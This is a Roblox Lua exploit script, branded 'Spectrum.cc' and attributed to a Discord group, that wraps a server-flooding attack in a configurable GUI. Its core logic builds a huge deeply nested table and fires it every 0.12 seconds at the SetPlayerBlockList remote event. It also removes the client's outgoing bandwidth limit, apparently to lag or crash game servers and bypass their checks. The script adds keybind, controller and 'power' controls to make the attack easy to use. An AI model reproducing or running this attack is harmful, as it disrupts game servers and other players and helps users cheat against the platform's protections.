--SOURUNA BAT TP
--discord.gg/kastorhub
--LEKAD BY FRNK33.
repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local NetworkClient = game:GetService("NetworkClient")

-- Cleanup old GUI
local function CleanupOldGUIs()
    local existing = CoreGui:FindFirstChild("MwvaneBypass")
    if existing then existing:Destroy() end
end
CleanupOldGUIs()

-- Config
local ConfigFile = "SPectrum.cc.json"
local Config = { 
    Keybind = "V", 
    GamepadKey = "ButtonY",
    PCPower = 100000,
    MobilePower = 72000,
    Mode = "PC",
    MobileScale = 1.0,
    Locked = false,
}

local function SaveConfig()
    if writefile then
        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
    end
end

local function LoadConfig()
    if isfile and isfile(ConfigFile) then
        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
        if success and data then
            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
            if type(data.GamepadKey) == "string" then Config.GamepadKey = data.GamepadKey end
            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
            if type(data.MobileScale) == "number" then Config.MobileScale = math.clamp(data.MobileScale, 0.7, 1.6) end
            if type(data.Locked) == "boolean" then Config.Locked = data.Locked end
        end
    end
end
LoadConfig()

-- Gamepad detection
local GAMEPAD_BUTTONS = {
    ButtonA=true, ButtonB=true, ButtonX=true, ButtonY=true,
    ButtonL1=true, ButtonR1=true, ButtonL2=true, ButtonR2=true,
    ButtonL3=true, ButtonR3=true, ButtonStart=true, ButtonSelect=true,
    DPadUp=true, DPadDown=true, DPadLeft=true, DPadRight=true,
}
local function isGamepadKeyName(name)
    return GAMEPAD_BUTTONS[name] == true
end

-- Bomb builder
local DEPTH = 290
local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MwvaneBypass"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
MainFrame.BackgroundTransparency = 0.15
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Size = UDim2.new(0, 260, 0, 260)
MainFrame.ClipsDescendants = true
local MainScale = Instance.new("UIScale", MainFrame)
MainScale.Scale = 1.0
local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 16)
local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(155, 89, 182)
MainStroke.Thickness = 1.2
MainStroke.Transparency = 0.5

local GlowFrame = Instance.new("Frame", MainFrame)
GlowFrame.Size = UDim2.new(1, 0, 1, 0)
GlowFrame.BackgroundColor3 = Color3.fromRGB(142, 68, 173)
GlowFrame.BackgroundTransparency = 0.95
GlowFrame.BorderSizePixel = 0
local GlowCorner = Instance.new("UICorner", GlowFrame)
GlowCorner.CornerRadius = UDim.new(0, 16)

-- Header
local Header = Instance.new("Frame")
Header.Parent = MainFrame
Header.BackgroundTransparency = 1
Header.Size = UDim2.new(1, 0, 0, 55)

local Title = Instance.new("TextLabel", Header)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Size = UDim2.new(0.55, -15, 1, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "Spectrum.cc"
Title.TextColor3 = Color3.fromRGB(155, 89, 182)
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left

local Subtitle = Instance.new("TextLabel", Header)
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0, 15, 0, 28)
Subtitle.Size = UDim2.new(0.5, -15, 0, 15)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = "bypass tool"
Subtitle.TextColor3 = Color3.fromRGB(180, 180, 210)
Subtitle.TextSize = 9
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

-- LOCK BUTTON
local LockBtn = Instance.new("TextButton", Header)
LockBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
LockBtn.BackgroundTransparency = 0
LockBtn.Font = Enum.Font.GothamBold
LockBtn.Text = Config.Locked and "🔒" or "🔓"
LockBtn.TextColor3 = Config.Locked and Color3.fromRGB(255, 255, 0) or Color3.fromRGB(220, 220, 255)
LockBtn.TextSize = 18
LockBtn.AutoButtonColor = false
LockBtn.Size = UDim2.new(0, 35, 0, 30)
LockBtn.Position = UDim2.new(0.48, -45, 0.5, -15)  -- default for PC
local LockCorner = Instance.new("UICorner", LockBtn)
LockCorner.CornerRadius = UDim.new(0, 8)
local LockStroke = Instance.new("UIStroke", LockBtn)
LockStroke.Color = Color3.fromRGB(155, 89, 182)
LockStroke.Thickness = 1.5

-- Mode Switch Button
local ModeSwitchBtn = Instance.new("TextButton", Header)
ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
ModeSwitchBtn.Font = Enum.Font.GothamBold
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOBILE"
ModeSwitchBtn.TextColor3 = Color3.fromRGB(155, 89, 182)
ModeSwitchBtn.TextSize = 12
ModeSwitchBtn.AutoButtonColor = false
local ModeCorner = Instance.new("UICorner", ModeSwitchBtn)
ModeCorner.CornerRadius = UDim.new(0, 20)
local ModeStroke = Instance.new("UIStroke", ModeSwitchBtn)
ModeStroke.Color = Color3.fromRGB(155, 89, 182)
ModeStroke.Thickness = 1

-- Size input (mobile only)
local SizeBox = Instance.new("TextBox", Header)
SizeBox.Size = UDim2.new(0, 40, 0, 24)
SizeBox.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
SizeBox.Font = Enum.Font.GothamBold
SizeBox.Text = tostring(Config.MobileScale)
SizeBox.TextColor3 = Color3.fromRGB(155, 89, 182)
SizeBox.TextSize = 11
SizeBox.ClearTextOnFocus = false
SizeBox.Visible = false
local SizeBoxCorner = Instance.new("UICorner", SizeBox)
SizeBoxCorner.CornerRadius = UDim.new(0, 8)
local SizeBoxStroke = Instance.new("UIStroke", SizeBox)
SizeBoxStroke.Color = Color3.fromRGB(155, 89, 182)
SizeBoxStroke.Thickness = 1
local SizeBoxTag = Instance.new("TextLabel", Header)
SizeBoxTag.BackgroundTransparency = 1
SizeBoxTag.Font = Enum.Font.Gotham
SizeBoxTag.Text = "size"
SizeBoxTag.TextColor3 = Color3.fromRGB(150, 150, 180)
SizeBoxTag.TextSize = 8
SizeBoxTag.TextXAlignment = Enum.TextXAlignment.Center
SizeBoxTag.Visible = false

-- Content
local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Parent = MainFrame
ContentFrame.BackgroundTransparency = 1
ContentFrame.Position = UDim2.new(0, 10, 0, 60)
ContentFrame.Size = UDim2.new(1, -20, 1, -70)
ContentFrame.ScrollBarThickness = 3
ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(155, 89, 182)
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

local Container = Instance.new("Frame")
Container.Parent = ContentFrame
Container.BackgroundTransparency = 1
Container.Size = UDim2.new(1, 0, 0, 0)

local UIList = Instance.new("UIListLayout", Container)
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 10)

local function updateCanvas()
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Container.AbsoluteSize.Y + 5)
end
UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
task.defer(updateCanvas)

-- Helper to build keybind rows
local function makeKeyCard(parent, labelText, btnText)
    local card = Instance.new("Frame", parent)
    card.Size = UDim2.new(1, 0, 0, 35)
    card.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
    card.BackgroundTransparency = 0.5
    local corner = Instance.new("UICorner", card)
    corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", card)
    stroke.Color = Color3.fromRGB(100, 60, 130)
    stroke.Thickness = 0.5

    local label = Instance.new("TextLabel", card)
    label.Size = UDim2.new(0.5, -10, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Gotham
    label.Text = labelText
    label.TextColor3 = Color3.fromRGB(200, 200, 230)
    label.TextSize = 11
    label.TextXAlignment = Enum.TextXAlignment.Left

    local btn = Instance.new("TextButton", card)
    btn.Position = UDim2.new(0.62, 0, 0.5, -10)
    btn.Size = UDim2.new(0, 75, 0, 20)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    btn.Font = Enum.Font.GothamBold
    btn.Text = btnText
    btn.TextColor3 = Color3.fromRGB(155, 89, 182)
    btn.TextSize = 10
    local bcorner = Instance.new("UICorner", btn)
    bcorner.CornerRadius = UDim.new(0, 6)
    return card, btn
end

-- PC Mode
local PCElements = Instance.new("Frame", Container)
PCElements.Size = UDim2.new(1, 0, 0, 0)
PCElements.BackgroundTransparency = 1
PCElements.Visible = Config.Mode == "PC"

local PCUIList = Instance.new("UIListLayout", PCElements)
PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
PCUIList.Padding = UDim.new(0, 8)

local PCCard = Instance.new("Frame", PCElements)
PCCard.Size = UDim2.new(1, 0, 0, 45)
PCCard.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
PCCard.BackgroundTransparency = 0.5
local PCCardCorner = Instance.new("UICorner", PCCard)
PCCardCorner.CornerRadius = UDim.new(0, 12)
local PCCardStroke = Instance.new("UIStroke", PCCard)
PCCardStroke.Color = Color3.fromRGB(100, 60, 130)
PCCardStroke.Thickness = 0.5

local PCToggleBtn = Instance.new("TextButton", PCCard)
PCToggleBtn.Size = UDim2.new(1, -20, 1, -10)
PCToggleBtn.Position = UDim2.new(0, 10, 0, 5)
PCToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
PCToggleBtn.Font = Enum.Font.GothamBold
PCToggleBtn.Text = "DISABLED"
PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
PCToggleBtn.TextSize = 13
PCToggleBtn.AutoButtonColor = false
local PCToggleCorner = Instance.new("UICorner", PCToggleBtn)
PCToggleCorner.CornerRadius = UDim.new(0, 8)
local PCToggleStroke = Instance.new("UIStroke", PCToggleBtn)
PCToggleStroke.Thickness = 2
PCToggleStroke.Color = Color3.fromRGB(155, 89, 182)
PCToggleStroke.Transparency = 0.5

local PCKeyCard, PCKeybindBtn = makeKeyCard(PCElements, "Keybind", Config.Keybind)
local PCPadCard, PCPadBtn = makeKeyCard(PCElements, "Controller", Config.GamepadKey)

local PCPowerCard = Instance.new("Frame", PCElements)
PCPowerCard.Size = UDim2.new(1, 0, 0, 35)
PCPowerCard.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
PCPowerCard.BackgroundTransparency = 0.5
local PCPowerCorner = Instance.new("UICorner", PCPowerCard)
PCPowerCorner.CornerRadius = UDim.new(0, 12)
local PCPowerStroke = Instance.new("UIStroke", PCPowerCard)
PCPowerStroke.Color = Color3.fromRGB(100, 60, 130)
PCPowerStroke.Thickness = 0.5

local PCPowerLabel = Instance.new("TextLabel", PCPowerCard)
PCPowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
PCPowerLabel.Position = UDim2.new(0, 10, 0, 0)
PCPowerLabel.BackgroundTransparency = 1
PCPowerLabel.Font = Enum.Font.Gotham
PCPowerLabel.Text = "Power"
PCPowerLabel.TextColor3 = Color3.fromRGB(200, 200, 230)
PCPowerLabel.TextSize = 11
PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local PCPowerInput = Instance.new("TextBox", PCPowerCard)
PCPowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
PCPowerInput.Size = UDim2.new(0, 70, 0, 20)
PCPowerInput.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
PCPowerInput.Font = Enum.Font.GothamBold
PCPowerInput.Text = tostring(Config.PCPower)
PCPowerInput.TextColor3 = Color3.fromRGB(155, 89, 182)
PCPowerInput.TextSize = 10
PCPowerInput.ClearTextOnFocus = false
local PCPowerInputCorner = Instance.new("UICorner", PCPowerInput)
PCPowerInputCorner.CornerRadius = UDim.new(0, 6)

local PCFooter = Instance.new("TextLabel", PCElements)
PCFooter.BackgroundTransparency = 1
PCFooter.Size = UDim2.new(1, 0, 0, 20)
PCFooter.Font = Enum.Font.Gotham
PCFooter.Text = "v2 - " .. tostring(Config.PCPower) .. " power"
PCFooter.TextColor3 = Color3.fromRGB(130, 130, 160)
PCFooter.TextSize = 9

-- Mobile Mode
local MobileElements = Instance.new("Frame", Container)
MobileElements.Size = UDim2.new(1, 0, 0, 0)
MobileElements.BackgroundTransparency = 1
MobileElements.Visible = Config.Mode == "Mobile"

local MobileUIList = Instance.new("UIListLayout", MobileElements)
MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
MobileUIList.Padding = UDim.new(0, 8)

local MobileCard = Instance.new("Frame", MobileElements)
MobileCard.Size = UDim2.new(1, 0, 0, 45)
MobileCard.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
MobileCard.BackgroundTransparency = 0.5
local MobileCardCorner = Instance.new("UICorner", MobileCard)
MobileCardCorner.CornerRadius = UDim.new(0, 12)

local MobileToggleBtn = Instance.new("TextButton", MobileCard)
MobileToggleBtn.Size = UDim2.new(1, -20, 1, -10)
MobileToggleBtn.Position = UDim2.new(0, 10, 0, 5)
MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
MobileToggleBtn.Font = Enum.Font.GothamBold
MobileToggleBtn.Text = "OFF"
MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
MobileToggleBtn.TextSize = 13
MobileToggleBtn.AutoButtonColor = false
local MobileToggleCorner = Instance.new("UICorner", MobileToggleBtn)
MobileToggleCorner.CornerRadius = UDim.new(0, 8)
local MobileToggleStroke = Instance.new("UIStroke", MobileToggleBtn)
MobileToggleStroke.Thickness = 2
MobileToggleStroke.Color = Color3.fromRGB(155, 89, 182)
MobileToggleStroke.Transparency = 0.5

local MobilePadCard, MobilePadBtn = makeKeyCard(MobileElements, "Controller", Config.GamepadKey)

local MobilePowerCard = Instance.new("Frame", MobileElements)
MobilePowerCard.Size = UDim2.new(1, 0, 0, 35)
MobilePowerCard.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
MobilePowerCard.BackgroundTransparency = 0.5
local MobilePowerCorner = Instance.new("UICorner", MobilePowerCard)
MobilePowerCorner.CornerRadius = UDim.new(0, 12)

local MobilePowerLabel = Instance.new("TextLabel", MobilePowerCard)
MobilePowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
MobilePowerLabel.Position = UDim2.new(0, 10, 0, 0)
MobilePowerLabel.BackgroundTransparency = 1
MobilePowerLabel.Font = Enum.Font.Gotham
MobilePowerLabel.Text = "Power"
MobilePowerLabel.TextColor3 = Color3.fromRGB(200, 200, 230)
MobilePowerLabel.TextSize = 11
MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local MobilePowerInput = Instance.new("TextBox", MobilePowerCard)
MobilePowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
MobilePowerInput.Size = UDim2.new(0, 70, 0, 20)
MobilePowerInput.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
MobilePowerInput.Font = Enum.Font.GothamBold
MobilePowerInput.Text = tostring(Config.MobilePower)
MobilePowerInput.TextColor3 = Color3.fromRGB(155, 89, 182)
MobilePowerInput.TextSize = 10
MobilePowerInput.ClearTextOnFocus = false
local MobilePowerInputCorner = Instance.new("UICorner", MobilePowerInput)
MobilePowerInputCorner.CornerRadius = UDim.new(0, 6)

local MobileFooter = Instance.new("TextLabel", MobileElements)
MobileFooter.BackgroundTransparency = 1
MobileFooter.Size = UDim2.new(1, 0, 0, 20)
MobileFooter.Font = Enum.Font.Gotham
MobileFooter.Text = "v2 - " .. tostring(Config.MobilePower) .. " power"
MobileFooter.TextColor3 = Color3.fromRGB(130, 130, 160)
MobileFooter.TextSize = 9

-- Spectrum effect
local spectrumRunning = true
task.spawn(function()
    local hue = 0
    while spectrumRunning and task.wait(0.05) do
        hue = (hue + 0.005) % 1
        local color = Color3.fromHSV(hue, 0.8, 0.9)
        if Title and Title.Parent then
            Title.TextColor3 = color
        end
        if Subtitle and Subtitle.Parent then
            Subtitle.TextColor3 = color
        end
        if ModeSwitchBtn and ModeSwitchBtn.Parent then
            ModeSwitchBtn.TextColor3 = color
        end
    end
end)

-- Bypass logic
local running = false
local bomb = nil
local spamThread = nil
local currentMode = Config.Mode
local SPAM_DELAY = 0.12

local function getCurrentPower()
    return currentMode == "PC" and Config.PCPower or Config.MobilePower
end

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = getCurrentPower()
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(SPAM_DELAY)
            end
        end)
    end
end

local function updateToggleVisuals(enabled)
    if currentMode == "PC" then
        if enabled then
            PCToggleBtn.Text = "ENABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
            PCToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
            PCToggleStroke.Color = Color3.fromRGB(0, 255, 0)
            PCToggleStroke.Transparency = 0
            PCCardStroke.Color = Color3.fromRGB(0, 255, 0)
        else
            PCToggleBtn.Text = "DISABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
            PCToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
            PCToggleStroke.Color = Color3.fromRGB(155, 89, 182)
            PCToggleStroke.Transparency = 0.5
            PCCardStroke.Color = Color3.fromRGB(100, 60, 130)
        end
    else
        if enabled then
            MobileToggleBtn.Text = "ON"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
            MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
            MobileToggleStroke.Color = Color3.fromRGB(0, 255, 0)
            MobileToggleStroke.Transparency = 0
            MainStroke.Color = Color3.fromRGB(0, 255, 0)
        else
            MobileToggleBtn.Text = "OFF"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
            MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
            MobileToggleStroke.Color = Color3.fromRGB(155, 89, 182)
            MobileToggleStroke.Transparency = 0.5
            MainStroke.Color = Color3.fromRGB(155, 89, 182)
        end
    end
end

local function ToggleBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

-- Layout adjustments for PC/Mobile
local function applyFrameSize()
    if currentMode == "Mobile" then
        MainScale.Scale = math.clamp(Config.MobileScale or 1.0, 0.7, 1.6)
        MainFrame.Size = UDim2.new(0, 225, 0, 205)
        -- Title: shorter
        Title.TextSize = 11
        Title.Size = UDim2.new(0, 80, 1, 0)
        Title.Position = UDim2.new(0, 8, 0, 2)
        -- Subtitle
        Subtitle.Position = UDim2.new(0, 8, 0, 24)
        Subtitle.Size = UDim2.new(0, 80, 0, 12)
        Subtitle.TextSize = 8
        
        -- Right-side elements: from left to right: SizeBox, ModeSwitch, Lock
        -- SizeBox (leftmost)
        SizeBox.Visible = true
        SizeBox.Size = UDim2.new(0, 40, 0, 22)
        SizeBox.Position = UDim2.new(0, 88, 0.5, -11)  -- x = 88
        SizeBox.TextSize = 10
        SizeBoxTag.Visible = true
        SizeBoxTag.Size = UDim2.new(0, 40, 0, 8)
        SizeBoxTag.Position = UDim2.new(0, 88, 0.5, -21)
        
        -- ModeSwitch (middle)
        ModeSwitchBtn.Size = UDim2.new(0, 50, 0, 22)
        ModeSwitchBtn.Position = UDim2.new(0, 132, 0.5, -11)
        ModeSwitchBtn.TextSize = 10
        
        -- LockBtn (rightmost)
        LockBtn.Size = UDim2.new(0, 32, 0, 24)
        LockBtn.Position = UDim2.new(0, 186, 0.5, -12)
        LockBtn.TextSize = 16
        
        -- Adjust content elements (these are already in the list, but we can tweak sizes if needed)
        MobileToggleBtn.TextSize = 13
        MobilePowerInput.TextSize = 11
        MobilePadBtn.TextSize = 11
        MobilePowerInput.Size = UDim2.new(0, 56, 0, 20)
        MobilePowerInput.Position = UDim2.new(1, -62, 0.5, -10)
        MobilePadBtn.Size = UDim2.new(0, 56, 0, 20)
        MobilePadBtn.Position = UDim2.new(1, -62, 0.5, -10)
    else
        -- PC layout
        MainScale.Scale = 1.0
        MainFrame.Size = UDim2.new(0, 260, 0, 260)
        Title.TextSize = 15
        Title.Size = UDim2.new(0.55, -15, 1, 0)
        Title.Position = UDim2.new(0, 15, 0, 0)
        Subtitle.Position = UDim2.new(0, 15, 0, 28)
        Subtitle.Size = UDim2.new(0.5, -15, 0, 15)
        Subtitle.TextSize = 9
        
        LockBtn.Size = UDim2.new(0, 35, 0, 30)
        LockBtn.Position = UDim2.new(0.48, -45, 0.5, -15)
        LockBtn.TextSize = 18
        ModeSwitchBtn.Size = UDim2.new(0, 85, 0, 28)
        ModeSwitchBtn.Position = UDim2.new(0.55, 0, 0.5, -14)
        ModeSwitchBtn.TextSize = 12
        SizeBox.Visible = false
        SizeBoxTag.Visible = false
    end
end

local function SwitchMode()
    if running then
        running = false
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
        updateToggleVisuals(false)
    end
    currentMode = currentMode == "PC" and "Mobile" or "PC"
    Config.Mode = currentMode
    PCElements.Visible = currentMode == "PC"
    MobileElements.Visible = currentMode == "Mobile"
    if currentMode == "PC" then
        ModeSwitchBtn.Text = "PC"
        PCFooter.Text = "v2 - " .. tostring(Config.PCPower) .. " power"
    else
        ModeSwitchBtn.Text = "MOBILE"
        MobileFooter.Text = "v2 - " .. tostring(Config.MobilePower) .. " power"
    end
    SaveConfig()
    applyFrameSize()
    updateCanvas()
end

-- Lock toggle
LockBtn.MouseButton1Click:Connect(function()
    Config.Locked = not Config.Locked
    LockBtn.Text = Config.Locked and "🔒" or "🔓"
    LockBtn.TextColor3 = Config.Locked and Color3.fromRGB(255, 255, 0) or Color3.fromRGB(220, 220, 255)
    LockBtn.BackgroundColor3 = Config.Locked and Color3.fromRGB(60, 60, 20) or Color3.fromRGB(40, 40, 60)
    SaveConfig()
end)

PCToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "PC" then ToggleBypass() end
end)
MobileToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "Mobile" then ToggleBypass() end
end)
ModeSwitchBtn.MouseButton1Click:Connect(SwitchMode)

-- Power inputs
PCPowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(PCPowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 150000)
        Config.PCPower = clampedValue
        PCPowerInput.Text = tostring(clampedValue)
    else
        Config.PCPower = 97000
        PCPowerInput.Text = "97000"
    end
    PCFooter.Text = "v2 - " .. tostring(Config.PCPower) .. " power"
    SaveConfig()
    if running and currentMode == "PC" then restartSpamLoop() end
end)

MobilePowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(MobilePowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 100000)
        Config.MobilePower = clampedValue
        MobilePowerInput.Text = tostring(clampedValue)
    else
        Config.MobilePower = 72000
        MobilePowerInput.Text = "72000"
    end
    MobileFooter.Text = "v2 - " .. tostring(Config.MobilePower) .. " power"
    SaveConfig()
    if running and currentMode == "Mobile" then restartSpamLoop() end
end)

SizeBox.FocusLost:Connect(function()
    local v = tonumber(SizeBox.Text)
    if v then
        v = math.clamp(v, 0.7, 1.6)
        Config.MobileScale = v
    else
        Config.MobileScale = 1.0
    end
    SizeBox.Text = tostring(Config.MobileScale)
    SaveConfig()
    applyFrameSize()
end)

-- Keybind rebind
local listeningForKey = false
PCKeybindBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    PCKeybindBtn.Text = "..."
    PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
end)

local listeningForPad = false
local function startPadListen(btn)
    listeningForPad = true
    btn.Text = "..."
    btn.TextColor3 = Color3.fromRGB(255, 200, 100)
end
PCPadBtn.MouseButton1Click:Connect(function() startPadListen(PCPadBtn) end)
MobilePadBtn.MouseButton1Click:Connect(function() startPadListen(MobilePadBtn) end)

local function refreshPadButtons()
    PCPadBtn.Text = Config.GamepadKey
    PCPadBtn.TextColor3 = Color3.fromRGB(155, 89, 182)
    MobilePadBtn.Text = Config.GamepadKey
    MobilePadBtn.TextColor3 = Color3.fromRGB(155, 89, 182)
end

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if listeningForPad then
        if input.UserInputType == Enum.UserInputType.Gamepad1
        or input.UserInputType == Enum.UserInputType.Gamepad2 then
            if isGamepadKeyName(input.KeyCode.Name) then
                Config.GamepadKey = input.KeyCode.Name
                listeningForPad = false
                refreshPadButtons()
                SaveConfig()
            end
        end
        return
    end
    if listeningForKey then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            Config.Keybind = input.KeyCode.Name
            PCKeybindBtn.Text = Config.Keybind
            PCKeybindBtn.TextColor3 = Color3.fromRGB(155, 89, 182)
            listeningForKey = false
            SaveConfig()
        end
        return
    end
    -- Keyboard toggle (PC only)
    if input.UserInputType == Enum.UserInputType.Keyboard
    and input.KeyCode.Name == Config.Keybind then
        if currentMode == "PC" then ToggleBypass() end
        return
    end
    -- Controller toggle (both modes)
    if (input.UserInputType == Enum.UserInputType.Gamepad1
        or input.UserInputType == Enum.UserInputType.Gamepad2)
    and input.KeyCode.Name == Config.GamepadKey then
        ToggleBypass()
        return
    end
end)

-- Draggable (respects lock)
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if Config.Locked then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if Config.Locked then return end
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)

-- Initialization
PCKeybindBtn.Text = Config.Keybind
PCPadBtn.Text = Config.GamepadKey
MobilePadBtn.Text = Config.GamepadKey
PCPowerInput.Text = tostring(Config.PCPower)
MobilePowerInput.Text = tostring(Config.MobilePower)
SizeBox.Text = tostring(Config.MobileScale)
PCFooter.Text = "v2 - " .. tostring(Config.PCPower) .. " power"
MobileFooter.Text = "v2 - " .. tostring(Config.MobilePower) .. " power"
PCElements.Visible = Config.Mode == "PC"
MobileElements.Visible = Config.Mode == "Mobile"
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOBILE"
applyFrameSize()
updateCanvas()
print("SPECTRUM SPEED BYPASS")
print("LEKAD BY FRNK33.") 
print("discord.gg/kastorhub")
